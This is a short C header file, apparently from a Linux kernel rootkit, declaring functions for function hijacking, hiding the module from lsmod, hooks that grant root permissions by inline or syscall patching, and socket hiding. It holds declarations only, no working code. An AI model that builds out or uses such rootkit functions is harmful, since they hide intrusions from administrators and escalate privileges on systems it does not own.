
#ifndef ROOTKIT_H
#define ROOTKIT_H

// hooking functions 
void hijack_start ( void *target, void *new, unsigned char** o_code);
void hijack_stop ( void *target, unsigned char* o_code);

// hide from lsmod (filldir)
int hide_directory(void);
int remove_hook(void);

// starting hook on root permissions (inline hook)
void start_root_hook_inline(void);
void stop_root_hook_inline(void);

// starting hook on root permissions (syscall)
void start_root_hook(void);
void stop_root_hook(void);

// socket hiding 
int hide_sock(void);
int remove_sock_hook(void);

#endif /* ROOTKIT_H */

